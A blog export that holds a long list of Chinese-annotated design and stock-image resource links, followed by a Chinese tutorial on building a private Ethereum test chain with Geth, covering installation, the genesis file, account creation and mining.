<li><a href="http://hao.jobbole.com/lovely-charts/" target="_blank" rel="noopener">Lovely Charts</a>：功能强大的在线图表制作工具</li>
<li><a href="http://hao.jobbole.com/cacoo/" target="_blank" rel="noopener">Cacoo</a>：在线简单易用的网络画图工具</li>
<li><a href="http://hao.jobbole.com/incogna/" target="_blank" rel="noopener">Incogna</a>：相似图片搜索引擎</li>
<li><a href="http://hao.jobbole.com/picitup/" target="_blank" rel="noopener">Picitup</a>：在线相似图片搜索引擎</li>
<li><a href="http://hao.jobbole.com/pincap/" target="_blank" rel="noopener">PinCap</a>：图片资源收集管理工具</li>
<li><a href="http://hao.jobbole.com/tineye/" target="_blank" rel="noopener">TinEye</a>：以图搜图的反向图片搜索引擎</li>
<li><a href="http://hao.jobbole.com/giphy/" target="_blank" rel="noopener">Giphy</a>：专搜GIF动态图的搜索引擎</li>
<li><a href="http://hao.jobbole.com/librestock/" target="_blank" rel="noopener">LibreStock</a>：一站搜寻二十个常用的图库网站</li>
<li><a href="http://hao.jobbole.com/assistor-ps/" target="_blank" rel="noopener">Assistor PS</a>：一个功能强大的PS辅助工具</li>
<li><a href="http://hao.jobbole.com/paintcode/" target="_blank" rel="noopener">PaintCode</a>：矢量图设计工具</li>
<li><a href="http://hao.jobbole.com/macaw/" target="_blank" rel="noopener">Macaw</a>：富有超前性和前瞻性的Web设计工具</li>
<li><a href="http://hao.jobbole.com/jimdo/" target="_blank" rel="noopener">Jimdo</a>：在线网页自助建站平台</li>
<li><a href="http://hao.jobbole.com/ceilfire/" target="_blank" rel="noopener">Ceilfire</a>：一个创建HTML5游戏并分享的平台</li>
<li><a href="http://hao.jobbole.com/weebly/" target="_blank" rel="noopener">Weebly</a>：快速搭建免费网站、博客和网店</li>
<li><a href="http://hao.jobbole.com/google-web-designer/" target="_blank" rel="noopener">Google Web Designer</a>：可视化HTML5网页和广告设计开发工具</li>
<li><a href="http://hao.jobbole.com/wix/" target="_blank" rel="noopener">Wix</a>：基于html5的免费网站生成应用</li>
<li><a href="http://hao.jobbole.com/vxplo/" target="_blank" rel="noopener">VXPLO</a>：专业的HTML5编辑工具</li>
<li><a href="http://hao.jobbole.com/%e6%98%93%e4%bc%81%e7%a7%80/" target="_blank" rel="noopener">易企秀</a>：H5页面移动微场景应用制作工具</li>
<li><a href="http://hao.jobbole.com/%e5%85%94%e5%b1%95/" target="_blank" rel="noopener">兔展</a>：微信场景应用的在线制作工具</li>
<li><a href="http://hao.jobbole.com/liveapp/" target="_blank" rel="noopener">Liveapp</a>：移动场景应用平台</li>
<li><a href="http://hao.jobbole.com/maka/" target="_blank" rel="noopener">MAKA</a>：简单、强大的H5创作工具</li>
<li><a href="http://hao.jobbole.com/%e5%88%9d%e9%a1%b5/" target="_blank" rel="noopener">初页</a>：微信H5海报创作工具</li>
<li><a href="http://hao.jobbole.com/%e7%99%bd%e6%9d%bf/" target="_blank" rel="noopener">白板</a>：设计图多人实时讨论工具</li>
<li><a href="http://hao.jobbole.com/ulead-cool-360/" target="_blank" rel="noopener">Ulead Cool 360</a>：一个全景图片生成器</li>
<li><a href="http://hao.jobbole.com/red-pen/" target="_blank" rel="noopener">Red pen</a>：设计图实时讨论工具</li>
<li><a href="http://hao.jobbole.com/coolsite360/" target="_blank" rel="noopener">Coolsite360</a>：无需编程的响应式网站设计工具</li>
<li><a href="http://hao.jobbole.com/epub360/" target="_blank" rel="noopener">Epub360</a>：专业级H5交互设计工具</li>
<li><a href="http://hao.jobbole.com/%e7%9a%ae%e5%bd%b1%e5%ae%a2/" target="_blank" rel="noopener">皮影客</a>：三分钟做部动画片</li>
<li><a href="http://hao.jobbole.com/webflow/" target="_blank" rel="noopener">Webflow</a>：傻瓜式网页设计制作平台</li>
<li><a href="http://hao.jobbole.com/quartz-composer/" target="_blank" rel="noopener">Quartz Composer</a>：图形化的编程工具</li>
<li><a href="http://hao.jobbole.com/after-effects/" target="_blank" rel="noopener">After Effects</a>：一款图形视频处理软件</li>
<li><a href="http://hao.jobbole.com/hype3/" target="_blank" rel="noopener">Hype 3</a>：帮助不会编程的用户轻松创建 HTML 5</li>
<li><a href="http://hao.jobbole.com/dorado/" target="_blank" rel="noopener">Dorado</a>：一款方便灵活的标注工具</li>
<li><a href="http://hao.jobbole.com/whatfontis/" target="_blank" rel="noopener">WhatFontIs</a>：在线图片字体识别工具</li>
<li><a href="http://hao.jobbole.com/%e5%9c%a8%e7%ba%bf%e8%ae%a4%e5%ad%97%e4%bd%93/" target="_blank" rel="noopener">在线认字体</a>：看图识字的求字体网</li>
<li><a href="http://hao.jobbole.com/markman/" target="_blank" rel="noopener">MarkMan马克鳗</a>：高效的设计稿标注、测量工具</li>
<li><a href="http://hao.jobbole.com/skala-preview/" target="_blank" rel="noopener">Skala Preview</a>：iOS UI 设计师必备</li>
<li><a href="http://hao.jobbole.com/briefs/" target="_blank" rel="noopener">Briefs</a>：专业APP设计工具</li>
<li><a href="http://hao.jobbole.com/placeit/" target="_blank" rel="noopener">Placeit</a>：在线预览APP界面设计效果图的模板工具</li>
<li><a href="http://hao.jobbole.com/ui-parde/" target="_blank" rel="noopener">UI Parde</a>：在线UI设计工具</li>
<li><a href="http://hao.jobbole.com/css-content-filter/" target="_blank" rel="noopener">CSS Content Filter</a>：易于定制、便于集成的CSS内容过滤工具</li>
<li><a href="http://hao.jobbole.com/tinycon/" target="_blank" rel="noopener">TinyCon</a>：用于管理Favicon和弹出框</li>
<li><a href="http://hao.jobbole.com/gitup/" target="_blank" rel="noopener">Gitup</a>：为Git所准备的图形化客户端</li>
<li><a href="http://hao.jobbole.com/unsplash-2/" target="_blank" rel="noopener">Unsplash</a>：用于网页中的图片占位符</li>
<li><a href="http://hao.jobbole.com/now-ui-kit/" target="_blank" rel="noopener">Now UI Kit</a>：用于网页设计、平板和手机的界面</li>
<li><a href="http://hao.jobbole.com/timber/" target="_blank" rel="noopener">Timber</a>：一款前端框架工具</li>
<li><a href="http://hao.jobbole.com/grid-guide/" target="_blank" rel="noopener">Grid.Guide</a>：计算栅格宽度的工具</li>
<li><a href="http://hao.jobbole.com/apostrophe/" target="_blank" rel="noopener">Apostrophe</a>：一款设计驱动下的内容管理系统</li>
<li><a href="http://hao.jobbole.com/bonsai/" target="_blank" rel="noopener">Bonsai</a>：一款为自由设计师所准备的工具</li>
<li><a href="http://hao.jobbole.com/gridlayout/" target="_blank" rel="noopener">GridLayout</a>：一款轻量级的栅格系统</li>
<li><a href="http://hao.jobbole.com/rucksack/" target="_blank" rel="noopener">Rucksack</a>：一款有趣的CSS工具</li>
<li><a href="http://hao.jobbole.com/flarum/" target="_blank" rel="noopener">Flarum</a>：一套简约易用的开源论坛系统</li>
<li><a href="http://hao.jobbole.com/lightning-design-systems/" target="_blank" rel="noopener">Lightning Design Systems</a>：专注于构建体验优秀的企业级APP</li>
<li><a href="http://hao.jobbole.com/frontify/" target="_blank" rel="noopener">Frontify</a>：维护品牌风格和样式的在线工具</li>
<li><a href="http://hao.jobbole.com/tinypng/" target="_blank" rel="noopener">TinyPng</a>：在线PNG图片压缩工具</li>
<li><a href="http://hao.jobbole.com/kendo-ui/" target="_blank" rel="noopener">Kendo UI</a> : jQuery HTML5 UI组件框架</li>
<li><a href="http://hao.jobbole.com/adobeedgewebfonts/" target="_blank" rel="noopener">AdobeEdgeWebFonts</a>：Adobe免费Web字体</li>
<li><a href="http://hao.jobbole.com/sizecalc/" target="_blank" rel="noopener">Sizecalc</a>：字体大小计算器</li>
<li><a href="http://hao.jobbole.com/inkpad/" target="_blank" rel="noopener">Inkpad</a>：iPad 矢量插图应用</li>
</ul>
<h3 id="设计教程"><a href="#设计教程" class="headerlink" title="设计教程"></a>设计教程</h3><ul>
<li><a href="http://hao.jobbole.com/sliderule/" target="_blank" rel="noopener">SlideRule</a>：在线免费课程搜索平台</li>
<li><a href="http://hao.jobbole.com/abduzeedo/" target="_blank" rel="noopener">Abduzeedo</a>：一家集创意灵感和教程的设计博客</li>
<li><a href="http://hao.jobbole.com/hackdesign/" target="_blank" rel="noopener">HackDesign</a>：黑客设计教学网</li>
<li><a href="http://hao.jobbole.com/lukew/" target="_blank" rel="noopener">Lukew</a>：干货文章分享，资深的用户体验专家</li>
<li><a href="http://hao.jobbole.com/ux-magazine/" target="_blank" rel="noopener">UX Magazine</a>：善于用通俗的案例讲解理论知识</li>
<li><a href="http://hao.jobbole.com/uxbooth/" target="_blank" rel="noopener">UXbooth</a>：专注于用户体验设计文章</li>
<li><a href="http://hao.jobbole.com/smashing-magazine/" target="_blank" rel="noopener">Smashing Magazine</a>：整体质量很高的设计文章</li>
<li><a href="http://hao.jobbole.com/the-great-discontent/" target="_blank" rel="noopener">The Great Discontent</a>：提供世界顶尖创意者的漫长访谈</li>
<li><a href="http://hao.jobbole.com/information-aesthetics/" target="_blank" rel="noopener">Information Aesthetics</a>：学习信息图设计和布局的网站</li>
<li><a href="http://hao.jobbole.com/about-tech/" target="_blank" rel="noopener">about tech</a>：数字排版开放课程</li>
<li><a href="http://hao.jobbole.com/aiga/" target="_blank" rel="noopener">AIGA</a>：专业的设计理论文章</li>
<li><a href="http://hao.jobbole.com/design-tutsplus/" target="_blank" rel="noopener">Design Tutsplus</a>：专业设计教程网</li>
</ul>
<h3 id="设计素材"><a href="#设计素材" class="headerlink" title="设计素材"></a>设计素材</h3><ul>
<li><a href="http://hao.jobbole.com/freepik/" target="_blank" rel="noopener">Freepik</a>：免费的素材搜索引擎</li>
<li><a href="http://hao.jobbole.com/rbno2-1/" target="_blank" rel="noopener">RBNo2.1</a>：是简化版的非衬线字体</li>
<li><a href="http://hao.jobbole.com/moki/" target="_blank" rel="noopener">Moki</a>：从七种不同的风格演变而来的字体</li>
<li><a href="http://hao.jobbole.com/king-wood-volume/" target="_blank" rel="noopener">King Wood Volume</a>：带有Tuscan的哥特式风格的字体</li>
<li><a href="http://hao.jobbole.com/window-dressing-jnl/" target="_blank" rel="noopener">Window Dressing JNL</a>：线条干净、简洁的字体</li>
<li><a href="http://hao.jobbole.com/zombie-sunrise/" target="_blank" rel="noopener">Zombie Sunrise</a>：一款手绘设计的字体</li>
<li><a href="http://hao.jobbole.com/toolkit/" target="_blank" rel="noopener">Toolkit</a>：一款免费的怀旧感字体</li>
<li><a href="http://hao.jobbole.com/poly/" target="_blank" rel="noopener">Poly</a>：一款基于几何排列的免费显示字体</li>
<li><a href="http://hao.jobbole.com/eaglefeather/" target="_blank" rel="noopener">Eaglefeather</a>：由P22 Type Foundry调整而来的字体</li>
<li><a href="http://hao.jobbole.com/hummingbird/" target="_blank" rel="noopener">Hummingbird</a>：一款既怀旧复古又有科技感的字体</li>
<li><a href="http://hao.jobbole.com/rosarian/" target="_blank" rel="noopener">Rosarian</a>：一款书法字体</li>
<li><a href="http://hao.jobbole.com/sketchrepo/" target="_blank" rel="noopener">Sketchrepo</a>：免费高品质的Sketch资源</li>
<li><a href="http://hao.jobbole.com/psdrepo/" target="_blank" rel="noopener">Psdrepo</a>：免费高品质的PSD资源</li>
<li><a href="http://hao.jobbole.com/the-pattern-library/" target="_blank" rel="noopener">The Pattern Library</a>：免费纹理素材资源网</li>
<li><a href="http://hao.jobbole.com/picjumbo/" target="_blank" rel="noopener">PicJumbo</a>：在线免费高质量素材网</li>
<li><a href="http://hao.jobbole.com/material-ui-colors/" target="_blank" rel="noopener">Material UI Colors</a>：为Material Design而生的配色模板</li>
<li><a href="http://hao.jobbole.com/design-kindle/" target="_blank" rel="noopener">Design Kindle</a>：免费网页UI设计素材下载站</li>
<li><a href="http://hao.jobbole.com/deviantart/" target="_blank" rel="noopener">DeviantArt</a>：最大的艺术和设计社区</li>
<li><a href="http://hao.jobbole.com/%e8%8a%b1%e7%93%a3%e7%bd%91/" target="_blank" rel="noopener">花瓣网</a>：设计师寻找灵感的天堂</li>
<li><a href="http://hao.jobbole.com/365psd/" target="_blank" rel="noopener">365PSD</a>：免费psd图片素材下载网站</li>
</ul>
<h3 id="配色方案"><a href="#配色方案" class="headerlink" title="配色方案"></a>配色方案</h3><ul>
<li><a href="http://hao.jobbole.com/spectrum/" target="_blank" rel="noopener">Spectrum</a>：色彩搭配、图片取色器工具</li>
<li><a href="http://hao.jobbole.com/coolors/" target="_blank" rel="noopener">Coolors</a>：自动生成配色色板的小工具</li>
<li><a href="http://hao.jobbole.com/material-palette/" target="_blank" rel="noopener">Material Palette</a>：Material Design专用在线配色工具</li>
<li><a href="http://hao.jobbole.com/material-ui-colors/" target="_blank" rel="noopener">Material UI Colors</a>：为Material Design而生的配色模板</li>
<li><a href="http://hao.jobbole.com/web%e5%ae%89%e5%85%a8%e8%89%b2/" target="_blank" rel="noopener">Web安全色</a>：WEB设计、开发中常用的安全颜色</li>
<li><a href="http://hao.jobbole.com/color-hunter/" target="_blank" rel="noopener">Color Hunter</a>：一个十分酷炫的配色网站</li>
<li><a href="http://hao.jobbole.com/%e9%85%8d%e8%89%b2%e7%bd%91/" target="_blank" rel="noopener">配色网</a>：国内的非盈利配色素材网站</li>
<li><a href="http://hao.jobbole.com/nippon-colors/" target="_blank" rel="noopener">Nippon colors</a>：日本传统用色色谱网站</li>
<li><a href="http://hao.jobbole.com/colorotate/" target="_blank" rel="noopener">Colorotate</a>：独特创意的设计调色板</li>
<li><a href="http://hao.jobbole.com/colorzilla/" target="_blank" rel="noopener">ColorZilla</a>：火狐浏览器网页取色器插件</li>
<li><a href="http://hao.jobbole.com/contrast-a/" target="_blank" rel="noopener">Contrast-A</a>：非常专业的调色板配置工具</li>
<li><a href="http://hao.jobbole.com/adobe-color-cc/" target="_blank" rel="noopener">Adobe Color CC</a>：Adobe取色器</li>
<li><a href="http://hao.jobbole.com/kuler/" target="_blank" rel="noopener">Kuler</a>：Adobe的配色工具</li>
<li><a href="http://hao.jobbole.com/color-scheme-designer%e7%bd%91%e7%ab%99/" target="_blank" rel="noopener">Color Palette Generator</a>：图片配色工具</li>
<li><a href="http://hao.jobbole.com/color-scheme-designer/" target="_blank" rel="noopener">Color Scheme Designer</a>：免费网络调色工具</li>
<li><a href="http://hao.jobbole.com/color-hunt/" target="_blank" rel="noopener">Color Hunt</a>：漂亮炫酷的配色方案</li>
<li><a href="http://hao.jobbole.com/brandseen/" target="_blank" rel="noopener">Brandseen</a>：匹配流行品牌LOGO颜色的在线游戏</li>
</ul>
<h3 id="高清图库"><a href="#高清图库" class="headerlink" title="高清图库"></a>高清图库</h3><ul>
<li><a href="http://hao.jobbole.com/photopin/" target="_blank" rel="noopener">PhotoPin</a>：基于Flickr图片资源搜索引擎</li>
<li><a href="http://hao.jobbole.com/splitshire/" target="_blank" rel="noopener">SplitShire</a>：免费高清摄影图片下载</li>
<li><a href="http://hao.jobbole.com/free-refe-mobile-photos/" target="_blank" rel="noopener">Free Refe Mobile Photos</a>：主要提供免费的手机图片</li>
<li><a href="http://hao.jobbole.com/photo-raster/" target="_blank" rel="noopener">Photo Raster</a>：在线免费图片编辑美化工具</li>
<li><a href="http://hao.jobbole.com/stock-up/" target="_blank" rel="noopener">Stock Up</a>：一次查找21个免费可商用图库网站</li>
<li><a href="http://hao.jobbole.com/wallpaperswide/" target="_blank" rel="noopener">Wallpaperswide</a>：精品壁纸下载站</li>
<li><a href="http://hao.jobbole.com/socwall/" target="_blank" rel="noopener">Socwall</a>：高清壁纸下载站</li>
<li><a href="http://hao.jobbole.com/flickr/" target="_blank" rel="noopener">flickr</a>：雅虎旗下图片分享网站</li>
<li><a href="http://hao.jobbole.com/500px/" target="_blank" rel="noopener">500px</a>：一个专业摄影师图片社区</li>
<li><a href="http://hao.jobbole.com/1x/" target="_blank" rel="noopener">1X</a>：一个优秀的摄影作品网站</li>
<li><a href="http://hao.jobbole.com/jaymantri/" target="_blank" rel="noopener">Jaymantri</a>：免费高清摄影图片网</li>
<li><a href="http://hao.jobbole.com/picography/" target="_blank" rel="noopener">Picography</a>：免费高清摄影图片分享网</li>
<li><a href="http://hao.jobbole.com/foodiesfeed/" target="_blank" rel="noopener">FoodiesFeed</a>：免费食品图片下载网站</li>
<li><a href="http://hao.jobbole.com/magdeleine/" target="_blank" rel="noopener">Magdeleine</a>：免费高清灵感图片网</li>
<li><a href="http://hao.jobbole.com/raumrot/" target="_blank" rel="noopener">Raumrot</a>：免费高分辨率无版权图片网</li>
<li><a href="http://hao.jobbole.com/freeimages/" target="_blank" rel="noopener">FreeImages</a>：免费商业图片素材网</li>
<li><a href="http://hao.jobbole.com/lifeofpix/" target="_blank" rel="noopener">LifeOfPix</a>：免费欧美生活图片网</li>
<li><a href="http://hao.jobbole.com/incogna/" target="_blank" rel="noopener">Incogna</a>：相似图片搜索引擎</li>
<li><a href="http://hao.jobbole.com/picitup/" target="_blank" rel="noopener">Picitup</a>：在线相似图片搜索引擎</li>
<li><a href="http://hao.jobbole.com/we-heart-it/" target="_blank" rel="noopener">We Heart It</a>：每天发现充满灵感且美丽的图片</li>
<li><a href="http://hao.jobbole.com/illusion/" target="_blank" rel="noopener">illusion</a>：展示最惊人的创意图片</li>
<li><a href="http://hao.jobbole.com/visualizeus/" target="_blank" rel="noopener">VisualizeUs</a>：一个图片收藏网站</li>
<li><a href="http://hao.jobbole.com/pincap/" target="_blank" rel="noopener">PinCap</a>：图片资源收集管理工具</li>
<li><a href="http://hao.jobbole.com/tineye/" target="_blank" rel="noopener">TinEye</a>：以图搜图的反向图片搜索引擎</li>
<li><a href="http://hao.jobbole.com/giphy/" target="_blank" rel="noopener">Giphy</a>：专搜GIF动态图的搜索引擎</li>
<li><a href="http://hao.jobbole.com/librestock/" target="_blank" rel="noopener">LibreStock</a>：一站搜寻二十个常用的图库网站</li>
<li><a href="http://hao.jobbole.com/im-free/" target="_blank" rel="noopener">IM Free</a>：免费高清图片库</li>
<li><a href="http://hao.jobbole.com/the-pattern-library/" target="_blank" rel="noopener">The Pattern Library</a>：免费纹理素材资源网</li>
<li><a href="http://hao.jobbole.com/picjumbo/" target="_blank" rel="noopener">PicJumbo</a>：在线免费高质量素材网</li>
<li><a href="http://hao.jobbole.com/design-kindle/" target="_blank" rel="noopener">Design Kindle</a>：免费网页UI设计素材下载站</li>
<li><a href="http://hao.jobbole.com/%e8%8a%b1%e7%93%a3%e7%bd%91/" target="_blank" rel="noopener">花瓣网</a>：设计师寻找灵感的天堂</li>
<li><a href="http://hao.jobbole.com/wallhaven/" target="_blank" rel="noopener">WallHaven</a>：高清壁纸图片搜索引擎</li>
<li><a href="http://hao.jobbole.com/snapographic/" target="_blank" rel="noopener">Snapographic</a>：免费高清照片订阅网</li>
<li><a href="http://hao.jobbole.com/twnsnd/" target="_blank" rel="noopener">Twnsnd</a>：免费复古照片公共档案库</li>
<li><a href="http://hao.jobbole.com/girly-drop/" target="_blank" rel="noopener">GIRLY DROP</a>：高清美女图片素材站</li>
<li><a href="http://hao.jobbole.com/foter/" target="_blank" rel="noopener">Foter</a>：免费图片素材搜索引擎</li>
<li><a href="http://hao.jobbole.com/designerspics/" target="_blank" rel="noopener">DesignersPics</a>：免费高清图片资源</li>
<li><a href="http://hao.jobbole.com/pexels/" target="_blank" rel="noopener">Pexels</a>：免费高品质图片 可商用</li>
<li><a href="http://hao.jobbole.com/gratisography/" target="_blank" rel="noopener">Gratisography</a>：定期发布高品质的免费照片</li>
<li><a href="http://hao.jobbole.com/function/" target="_blank" rel="noopener">Function</a>：优秀的图片网站</li>
<li><a href="http://hao.jobbole.com/pixabay/" target="_blank" rel="noopener">Pixabay</a>：内容丰富的摄影照片网站</li>
<li><a href="http://hao.jobbole.com/death-to-the-stock-photo/" target="_blank" rel="noopener">Death To The Stock Photo</a>：高品质的照片网站</li>
<li><a href="http://hao.jobbole.com/dotspin/" target="_blank" rel="noopener">DotSpin</a>：漂亮的图片素材网站</li>
<li><a href="http://hao.jobbole.com/new-old-stock/" target="_blank" rel="noopener">New Old Stock</a>：一个有趣的复古照片网站</li>
<li><a href="http://hao.jobbole.com/superfamous-studios/" target="_blank" rel="noopener">Superfamous</a>：免费高质量图片素材</li>
<li><a href="http://hao.jobbole.com/little-visuals/" target="_blank" rel="noopener">Little Visuals</a>：免费高质量图片素材</li>
<li><a href="http://hao.jobbole.com/unsplash/" target="_blank" rel="noopener">Unsplash</a>： 高品质免费图片素材库</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>1.1、基于Geth搭建私链</title>
    <url>/%E5%8C%BA%E5%9D%97%E9%93%BE/1.1%E3%80%81%E5%9F%BA%E4%BA%8EGeth%E6%90%AD%E5%BB%BA%E7%A7%81%E9%93%BE/</url>
    <content><![CDATA[<blockquote>
<p>为什么要搭建私有链？</p>
<p>在以太坊的公有链上部署智能合约、发起交易需要花费以太币，要同步公有链数据块（xGB）。而在私有链，上面这些都不用，我们进行智能合约开发测试就很方便了，开发完成了，再部署到公有链。</p>
</blockquote>
<h5 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h5><p>vmware内的ubuntu14.04，字符终端，通过ssh连接。</p>
<h5 id="安装Geth"><a href="#安装Geth" class="headerlink" title="安装Geth"></a>安装Geth</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install software-properties-common</span><br><span class="line">sudo add-apt-repository -y ppa:ethereum/ethereum</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install ethereum</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kevinwen@vm:~$ geth version</span><br><span class="line">Geth</span><br><span class="line">Version: 1.8.2-stable</span><br><span class="line">Git Commit: b8b9f7f4476a30a0aaf6077daade6ae77f969960</span><br><span class="line">Architecture: 386</span><br><span class="line">Protocol Versions: [63 62]</span><br><span class="line">Network Id: 1</span><br><span class="line">Go Version: go1.9.4</span><br><span class="line">Operating System: linux</span><br><span class="line">GOPATH=</span><br><span class="line">GOROOT=/usr/lib/go-1.9</span><br></pre></td></tr></table></figure>
<h5 id="准备创世区块配置文件"><a href="#准备创世区块配置文件" class="headerlink" title="准备创世区块配置文件"></a>准备创世区块配置文件</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kevinwen@vm:~$ mkdir private-geth</span><br><span class="line">kevinwen@vm:~$ cd private-geth/</span><br><span class="line">kevinwen@vm:~/private-geth$ vim genesis.json</span><br><span class="line">&#123;</span><br><span class="line">  "config": &#123;</span><br><span class="line">        "chainId": 15,</span><br><span class="line">        "homesteadBlock": 0,</span><br><span class="line">        "eip155Block": 0,</span><br><span class="line">        "eip158Block": 0</span><br><span class="line">    &#125;,</span><br><span class="line">    "coinbase" : "0x0000000000000000000000000000000000000000",</span><br><span class="line">    "difficulty" : "0x20000",</span><br><span class="line">    "extraData" : "",</span><br><span class="line">    "gasLimit" : "0x2fefd8",</span><br><span class="line">    "nonce" : "0x0000000000000042",</span><br><span class="line">    "mixhash" : "0x0000000000000000000000000000000000000000000000000000000000000000",</span><br><span class="line">    "parentHash" : "0x0000000000000000000000000000000000000000000000000000000000000000",</span><br><span class="line">    "timestamp" : "0x00",</span><br><span class="line">    "alloc": &#123; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="初始化创世区块"><a href="#初始化创世区块" class="headerlink" title="初始化创世区块"></a>初始化创世区块</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kevinwen@vm:~/private-geth$ geth --datadir data0 init genesis.json</span><br></pre></td></tr></table></figure>
<p>data0 就是当前目录下用此目录存放区块链数据</p>
<p><img src="/images/blockchain/初始化.png" alt="初始化.png"></p>
<p><img src="/images/blockchain/目录结构.png" alt="目录结构.png"></p>
<p>geth中保存的是区块链的相关数据，keystore中保存的是该链条中的用户信息</p>
<h5 id="启动自己的私有链条"><a href="#启动自己的私有链条" class="headerlink" title="启动自己的私有链条"></a>启动自己的私有链条</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kevinwen@vm:~/private-geth$ geth --datadir data0 --networkid 1108 --nodiscover console 2&gt;&gt;geth.log</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> eth.accounts</span></span><br><span class="line">[]</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> personal.newAccount(<span class="string">"kevin"</span>)</span></span><br><span class="line">"0xf3ddc02af85fe4272398c53f60561ce01d01d757"</span><br></pre></td></tr></table></figure>
<p><code>--nodiscover</code> 是不要让公网上的节点发现本私有链。</p>
<p><code>2&gt;&gt;geth.log</code> 是把日志写入到文件，不打印到终端。</p>
<p>personal.newAccount(“kevin”)  创建一个帐号，密码为 “kevin”</p>
<p><img src="/images/blockchain/启动和创建帐号.png" alt="启动和创建帐号"></p>
<p>日志<br><img src="/images/blockchain/新建账号日志.png" alt="新建账号日志.png"></p>
<h5 id="开始挖矿"><a href="#开始挖矿" class="headerlink" title="开始挖矿"></a>开始挖矿</h5><p><code>miner.start()</code> 开始挖矿，可以用start(2) 来启动2个线程挖矿。</p>
<p><code>miner.stop()</code> 停止挖矿</p>
<p><img src="/images/blockchain/挖矿.png" alt="挖矿.png"></p>
<p>查看帐号的余额，还是0，查看一下log文件，如下：</p>
<p><img src="/images/blockchain/log.png" alt="log.png"></p>
<p>这是第一次启动挖矿会先生成挖矿所需的<code>DAG</code>文件，这个过程有点慢，等进度达到100%后，就会开始挖矿。</p>
<p>执行一段时间，还没开始挖矿，就出现错误了，内存不够？？？</p>
<p><img src="/images/blockchain/error.png" alt="error.png"></p>
<figure class="highlight verilog"><table><tr><td class="code"><pre><span class="line">runtime: out of memory: cannot allocate <span class="number">2164260864</span>-<span class="keyword">byte</span> block (<span class="number">675676160</span> in <span class="keyword">use</span>)</span><br><span class="line">意思就是无法生成<span class="number">2</span>GB大小的DAG文件，系统的<span class="number">600</span>MB内存已经被使用了。</span><br></pre></td></tr></table></figure>
<p>这是测试机的配置(原本500M内存，调高了还是不行)太低了，看来要换台机啊！</p>
<h5 id="换机器"><a href="#换机器" class="headerlink" title="换机器"></a>换机器</h5><blockquote>
<p>环境：</p>
<p>vmware内的ubuntu16.04，GNOME图形界面。</p>
</blockquote>
<p>这次在 <code>创世纪块</code> 的 <code>alloc</code> 初始化两个账户，里面初始化一些以太币。账户可以先进入console创建，再写到 <code>genesis.json</code> 文件，然后才初始化创世纪块。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 我没有先创建，以下账号地址不是真实的。</span></span><br><span class="line">sam@ubuntu:~/private-geth$ geth console</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> persional.newAccont(<span class="string">"123456"</span>)</span></span><br><span class="line">"7df9a875a174b3bc565e6424a0050ebc1b2d1d82"</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> persional.newAccont(<span class="string">"123456"</span>)</span></span><br><span class="line">"f41c74c9ae680c1aa78f42e5647a62f353b7bdde"</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> eth.accounts</span></span><br><span class="line">["7df9a875a174b3bc565e6424a0050ebc1b2d1d82","f41c74c9ae680c1aa78f42e5647a62f353b7bdde"]</span><br></pre></td></tr></table></figure>
<p>编写 <code>genesis.json</code> 文件</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">"config"</span>: &#123;</span><br><span class="line">		<span class="attr">"chainId"</span>: <span class="number">15</span>,</span><br><span class="line">		<span class="attr">"homesteadBlock"</span>: <span class="number">0</span>,</span><br><span class="line">		<span class="attr">"eip155Block"</span>: <span class="number">0</span>,</span><br><span class="line">		<span class="attr">"eip158Block"</span>: <span class="number">0</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">"coinbase"</span>: <span class="string">"0x0000000000000000000000000000000000000000"</span>,</span><br><span class="line">	<span class="attr">"difficulty"</span>: <span class="string">"0x20000"</span>,</span><br><span class="line">	<span class="attr">"extraData"</span>: <span class="string">""</span>,</span><br><span class="line">	<span class="attr">"gasLimit"</span>: <span class="string">"0x2fefd8"</span>,</span><br><span class="line">	<span class="attr">"nonce"</span>: <span class="string">"0x0000000000000042"</span>,</span><br><span class="line">	<span class="attr">"mixhash"</span>: <span class="string">"0x0000000000000000000000000000000000000000000000000000000000000000"</span>,</span><br><span class="line">	<span class="attr">"parentHash"</span>: <span class="string">"0x0000000000000000000000000000000000000000000000000000000000000000"</span>,</span><br><span class="line">	<span class="attr">"timestamp"</span>: <span class="string">"0x00"</span>,</span><br><span class="line">	<span class="attr">"alloc"</span>: &#123;</span><br><span class="line">		<span class="attr">"7df9a875a174b3bc565e6424a0050ebc1b2d1d82"</span>: &#123;</span><br><span class="line">			<span class="attr">"balance"</span>: <span class="string">"300000"</span></span><br><span class="line">		&#125;,</span><br><span class="line">		<span class="attr">"f41c74c9ae680c1aa78f42e5647a62f353b7bdde"</span>: &#123;</span><br><span class="line">			<span class="attr">"balance"</span>: <span class="string">"400000"</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>设置账户<code>7df9a875a174b3bc565e6424a0050ebc1b2d1d82</code>为默认的挖矿账户。不设置时，默认为第一个账户，即<code>account[0]</code></p>
<p><img src="/images/blockchain/1212.png" alt="1212.png"></p>
<p><img src="/images/blockchain/2323.png" alt="2323.png"></p>
<p>开始挖矿了…</p>
<p><img src="/images/blockchain/4545.png" alt="4545.png"></p>
<p>停止挖矿</p>
<p><img src="/images/blockchain/7878.png" alt="7878.png"></p>
<p>换一个账户挖矿</p>
<p><img src="/images/blockchain/啊啊啊.png" alt="啊啊啊.png"></p>
<p><img src="/images/blockchain/aaa.png" alt="aaa.png"></p>
<p>OK，先到这。</p>
<p><a href="https://blog.csdn.net/vinsuan1993/article/details/75208203" target="_blank" rel="noopener">参考1</a></p>
